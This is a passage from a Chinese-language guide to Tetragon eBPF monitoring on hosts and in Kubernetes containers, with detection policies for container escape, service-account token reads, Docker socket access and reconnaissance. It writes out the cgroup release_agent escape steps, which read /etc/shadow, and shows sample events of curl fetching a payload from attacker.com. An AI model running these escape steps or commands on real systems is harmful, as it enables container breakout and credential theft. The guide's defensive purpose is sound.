    operator: NotIn
    values:
    - "host_ns"         # 仅在非主机 User NS 中阻止
  matchArgs:
  - index: 0
    operator: "Equal"
    values:
    - "security.capability\0"
  matchActions:
  - action: Override
    argError: 1          # 阻止复制 security.capability xattr
```

### 6.2 部署方式差异

| 维度 | 主机部署 | K8s 容器部署 |
|------|---------|-------------|
| 安装方式 | systemd service / 手动运行 | Helm Chart 部署 DaemonSet |
| 二进制位置 | `/usr/local/bin/tetragon` | DaemonSet 容器内 |
| BPF 对象 | `/var/lib/tetragon/bpf/` | 容器内挂载 |
| 配置文件 | `/etc/tetragon/` | ConfigMap / Helm values |
| 日志输出 | journald / 文件 | stdout → K8s 日志收集 |
| 运行权限 | root / CAP_BPF+CAP_SYS_ADMIN | 特权容器或指定 capabilities |

### 6.3 策略交付方式

**主机环境** — 文件方式：

```bash
# 启动时指定策略文件
tetragon --bpf-lib /var/lib/tetragon/bpf/ \
         --tracing-policy /etc/tetragon/policies/host-monitor.yaml

# 或放在策略目录中自动加载
ls /etc/tetragon/tetragon.tp.d/
  host-file-monitor.yaml
  host-network-monitor.yaml
```

**K8s 环境** — CRD 方式：

```bash
# 集群级策略（所有命名空间生效）
kubectl apply -f - <<EOF
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "cluster-wide-monitor"
spec:
  kprobes:
  - call: "tcp_connect"
    # ...
EOF

# 命名空间级策略（仅在指定命名空间生效）
kubectl apply -n production -f - <<EOF
apiVersion: cilium.io/v1alpha1
kind: TracingPolicyNamespaced
metadata:
  name: "production-monitor"
spec:
  kprobes:
  - call: "security_file_open"
    # ...
EOF
```

**TracingPolicy vs TracingPolicyNamespaced**：

| 维度 | TracingPolicy | TracingPolicyNamespaced |
|------|---------------|----------------------|
| 作用域 | 集群全局 | 单个 K8s Namespace |
| 创建权限 | cluster-admin | namespace admin |
| 适用场景 | 基线安全策略 | 应用特定策略 |
| 主机进程覆盖 | 是 | 否（仅覆盖该 NS 中的 Pod） |

### 6.4 事件输出差异

主机进程和容器进程的事件输出在字段丰富度上存在显著差异：

**主机进程事件**（JSON 格式简化）：

```json
{
  "process_kprobe": {
    "process": {
      "binary": "/usr/bin/curl",
      "arguments": "http://attacker.com/payload",
      "pid": { "value": 12345 },
      "uid": { "value": 0 },
      "start_time": "2024-01-15T10:30:00Z",
      "auid": { "value": 1000 },
      "namespaces": {
        "pid": { "inum": 4026531836, "is_host": true },
        "net": { "inum": 4026531840, "is_host": true },
        "mnt": { "inum": 4026531841, "is_host": true }
      }
    },
    "parent": {
      "binary": "/usr/bin/bash"
    },
    "function_name": "tcp_connect"
  }
}
```

**容器进程事件**（额外包含 Pod/Container 元数据）：

```json
{
  "process_kprobe": {
    "process": {
      "binary": "/usr/bin/curl",
      "arguments": "http://attacker.com/payload",
      "pid": { "value": 67890 },
      "uid": { "value": 0 },
      "start_time": "2024-01-15T10:30:00Z",
      "namespaces": {
        "pid": { "inum": 4026532456, "is_host": false },
        "net": { "inum": 4026532460, "is_host": false },
        "mnt": { "inum": 4026532461, "is_host": false }
      },
      "pod": {
        "namespace": "production",
        "name": "webapp-deploy-7b8c9d-x4k2p",
        "uid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
        "container": {
          "id": "containerd://a1b2c3d4e5f6...",
          "name": "webapp",
          "image": {
            "id": "docker.io/library/python:3.11-slim",
            "name": "python:3.11-slim"
          },
          "pid": { "value": 1 }
        },
        "pod_labels": {
          "app": "webapp",
          "version": "v2.1"
        },
        "workload": "webapp-deploy",
        "workload_kind": "Deployment"
      }
    },
    "function_name": "tcp_connect"
  }
}
```

### 6.5 分层部署策略

推荐的分层策略架构：

```
┌──────────────────────────────────────────────────┐
│          Layer 4: 容器特有威胁层                  │
│  容器逃逸检测、K8s API 滥用、Docker Socket 访问   │
│  matchNamespaces: NotIn host_ns                  │
├──────────────────────────────────────────────────┤
│          Layer 3: 容器专用层                      │
│  ServiceAccount Token 访问、容器内工具下载        │
│  matchNamespaces: NotIn host_ns                  │
├──────────────────────────────────────────────────┤
│          Layer 2: 主机专用层                      │
│  SSH 异常登录、主机配置修改、内核模块加载          │
│  matchNamespaces: In host_ns                     │
├──────────────────────────────────────────────────┤
│          Layer 1: 通用基线层                      │
│  反弹 Shell 检测、敏感文件访问、异常网络外连       │
│  无 matchNamespaces（覆盖所有环境）               │
└──────────────────────────────────────────────────┘
```

---

## 第七部分：容器特有威胁与检测

### 7.1 容器逃逸检测

容器逃逸是容器环境中最严重的安全威胁，攻击者试图突破容器隔离获得主机访问权限。Tetragon 可以检测多种逃逸手法。

#### 7.1.1 特权容器通过 mount 逃逸

特权容器可以挂载主机文件系统实现逃逸：

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "container-escape-mount"
spec:
  kprobes:
  - call: "security_sb_mount"
    syscall: false
    args:
    - index: 0
      type: "string"     # 挂载源
    - index: 1
      type: "path"       # 挂载目标
    - index: 2
      type: "string"     # 文件系统类型
    selectors:
    - matchNamespaces:
      - namespace: Pid
        operator: NotIn
        values:
        - "host_ns"
      matchActions:
      - action: Post
```

#### 7.1.2 Cgroup release_agent 逃逸

攻击者利用 cgroup 的 `release_agent` 机制在主机命名空间中执行命令：

```bash
# 攻击步骤（在特权容器内）
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
```

检测策略需要监控 cgroup 文件系统的挂载和 `release_agent` 的写入。

#### 7.1.3 runc CVE 利用

利用容器运行时漏洞（如 CVE-2024-21626 的 `WORKDIR` 泄露）实现逃逸。Tetragon 通过监控 `sys_execveat` 的异常 `dirfd` 参数或异常的 `/proc/self/fd` 访问来检测。

### 7.2 K8s API 滥用

#### 7.2.1 ServiceAccount Token 读取

容器进程读取 ServiceAccount token 通常是横向移动的前兆：

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "k8s-token-access"
spec:
  kprobes:
  - call: "security_file_open"
    syscall: false
    args:
    - index: 0
      type: "file"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Prefix"
        values:
        - "/var/run/secrets/kubernetes.io/serviceaccount/token"
      matchNamespaces:
      - namespace: Pid
        operator: NotIn
        values:
        - "host_ns"
      # 排除已知需要读取 token 的合法二进制
      matchBinaries:
      - operator: "NotIn"
        values:
        - "/app/known-service"
      matchActions:
      - action: Post
```

#### 7.2.2 K8s API Server 连接

监控容器到 K8s API Server 的直接连接：

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "k8s-api-access"
spec:
  kprobes:
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchArgs:
      - index: 0
        operator: "DportIn"
        values:
        - "6443"            # K8s API Server 默认端口
        - "443"             # API Server 可能使用 443
      matchNamespaces:
      - namespace: Pid
        operator: NotIn
        values:
        - "host_ns"
      matchActions:
      - action: Post
```

### 7.3 Docker Socket 利用

如果 Docker Socket 被挂载到容器中（常见的不安全配置），攻击者可以控制 Docker Daemon 创建特权容器：

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "docker-socket-access"
spec:
  kprobes:
  - call: "security_file_open"
    syscall: false
    args:
    - index: 0
      type: "file"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Equal"
        values:
        - "/var/run/docker.sock"
      matchNamespaces:
      - namespace: Pid
        operator: NotIn
        values:
        - "host_ns"
      matchActions:
      - action: Post
```

### 7.4 容器环境侦查命令

攻击者在容器内进行环境侦查的典型命令：

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "container-recon-detection"
spec:
  kprobes:
  - call: "sys_execve"
    syscall: true
    args:
    - index: 0
      type: "string"
    selectors:
    # 容器环境检测命令
    - matchArgs:
      - index: 0
        operator: "Postfix"
        values:
        - "/.dockerenv"        # cat /.dockerenv — 确认容器环境
      matchNamespaces:
      - namespace: Pid
        operator: NotIn
        values:
        - "host_ns"
      matchActions:
      - action: Post
  # 监控读取容器元数据
  - call: "security_file_open"
    syscall: false
    args:
    - index: 0
      type: "file"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Prefix"
        values:
        - "/proc/1/cgroup"     # 判断是否在容器中
        - "/.dockerenv"        # Docker 环境标识
      matchNamespaces:
      - namespace: Pid
        operator: NotIn
        values:
        - "host_ns"
      matchActions:
      - action: Post
```

---

## 第八部分：综合对比与最佳实践

### 8.1 三场景 × 两环境总结矩阵

| 检测场景 | 维度 | 主机环境 | 容器环境 | 差异程度 |
|---------|------|---------|---------|---------|
| **高危命令** | 二进制路径 | 工具链完整，需广泛监控 | 工具受限，任何异常工具都高度可疑 | 🟡 中 |
| | 进程树 | 深层级，异常需上下文判断 | 浅层级，Shell 子进程即异常 | 🟡 中 |
| | 命令参数 | 系统级侦查命令 | K8s/容器级侦查命令 | 🟡 中 |
| **反弹 Shell** | 网络连接 | IP 直接对应物理网络 | 需排除 Pod/Service CIDR | 🟡 中 |
| | FD 重定向 | 完全相同 | 完全相同 | 🟢 无 |
| | 文件访问 | 完全相同 | 完全相同 | 🟢 无 |
| **文件监控** | 路径解析 | 真实文件系统路径 | OverlayFS 容器视角路径 | 🔴 大 |
| | 敏感文件集 | `/etc/shadow`、SSH 密钥 | SA Token、Docker Socket | 🔴 大 |
| | Mount 操作 | 正常运维操作较多 | 异常挂载高度可疑 | 🔴 大 |
| **策略作用域** | 交付方式 | 文件 | CRD (TracingPolicy/TracingPolicyNamespaced) | 🔴 大 |
| | 事件元数据 | 基本进程信息 | 进程 + Pod/Container/Workload | 🔴 大 |
| **特有威胁** | 容器逃逸 | N/A | mount/cgroup/runc CVE | 🔴 大 |
| | K8s 滥用 | N/A | SA Token/API Server | 🔴 大 |

### 8.2 最佳实践清单

#### 策略作用域

1. **始终指定作用域**：每条策略都应明确是面向主机（`In host_ns`）、容器（`NotIn host_ns`）还是通用（无 `matchNamespaces`）
2. **使用分层架构**：通用基线层 → 环境专用层 → 威胁专用层
3. **K8s 环境优先使用 CRD**：利用 `TracingPolicyNamespaced` 实现命名空间级别的策略隔离
4. **避免过度宽泛的策略**：主机和容器的噪声模式不同，合并策略容易产生过多误报

#### 路径适配

5. **文件监控使用容器内路径**：Tetragon 的 dentry walking 返回容器视角的路径，策略中直接使用 `/etc/shadow` 而非 overlay 路径
6. **主机和容器的敏感文件列表应分开维护**：两种环境的高价值目标不同
7. **注意 Volume 挂载**：容器中挂载的主机路径会以挂载点路径呈现

#### 网络拓扑感知

8. **容器网络策略需排除 K8s 内部流量**：Pod CIDR、Service CIDR、CoreDNS IP
9. **注意 hostNetwork Pod**：使用主机网络命名空间的 Pod 在网络维度上与主机进程相同
10. **CIDR 过滤需与集群网络配置同步**：Pod/Service CIDR 变更时需更新策略

#### 元数据利用

11. **容器事件利用 Pod 标签做关联**：`pod_labels` 可用于区分不同应用的基线行为
12. **Workload 信息辅助告警分类**：`workload` 和 `workload_kind` 帮助确定影响范围
13. **容器启动时间辅助异常判断**：进程启动时间与容器启动时间的差值可作为异常指标

#### 容器特有威胁

14. **特权容器必须单独监控**：额外的 mount/cgroup/device 操作监控
15. **ServiceAccount Token 读取应基线化**：明确哪些进程应该读取 token
16. **Docker Socket 挂载应视为高风险**：任何容器内的 Socket 访问都应告警

---

## 附录：环境感知相关源码索引

| 源码文件 | 行号 | 功能说明 |
|---------|------|---------|
| `bpf/process/bpf_process_event.h` | 166-254 | BPF 侧命名空间 inode 读取 |
| `bpf/lib/bpf_d_path.h` | 156-352 | dentry walking 路径解析 |
| `bpf/process/types/sock.h` | 26-67 | Socket 元组数据提取 |
| `pkg/reader/namespace/namespace_linux.go` | 全文 | Go 侧 IsHost 比较逻辑 |
| `pkg/selectors/kernel.go` | 1183-1202 | `host_ns` 关键字解析 |
| `pkg/watcher/pod.go` | 全文 | Pod/Container 映射 |
| `pkg/policyfilter/namespace.go` | 全文 | Cgroup→Namespace BPF Map 管理 |
| `api/v1/tetragon/tetragon.proto` | 28-114 | Container/Pod/Namespace Protobuf 定义 |
